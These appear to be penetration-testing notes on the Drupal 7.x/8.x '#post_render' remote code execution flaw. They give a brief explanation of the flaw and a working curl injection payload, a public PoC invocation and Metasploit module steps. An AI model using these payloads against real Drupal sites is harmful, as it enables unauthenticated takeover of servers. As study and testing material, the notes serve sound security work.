- Critical unauthenticated RCE vulnerability.
- Affects `Drupal 7.x and 8.x.`.
- Allows execution of arbitrary PHP code.
- Abuses Drupal's Form API rendering system via `#post_render` callbacks.
# Vulnerability

- Drupal allows forms to define special keys to execute functions after rendering.
- Injecting malicious form values can execute system commands through PHP:
	- `#post_render[] = passthru`
- Render array system processes untrusted values before authentication is enforced.
# Exploitation

- Using public Python PoCs:
	- `python3 drupalgeddon2.py -t http://target -c "id"`
		- sends POST request to `/user/register`, injecting a render array calling PHP function like `passthru()` or `system()`.
- Manual exploitation:
	- `curl -X POST http://target/?q=user/password --data "form_id=user_pass&_triggering_element_name=name&name[#post_render][]=passthru&name[#markup]=id"`
		- triggers a system call - id.
- Metasploit:
	- `use exploit/unix/webapp/drupal_drupalgeddon2`
	- `set RHOSTS http://target`
	- `run`
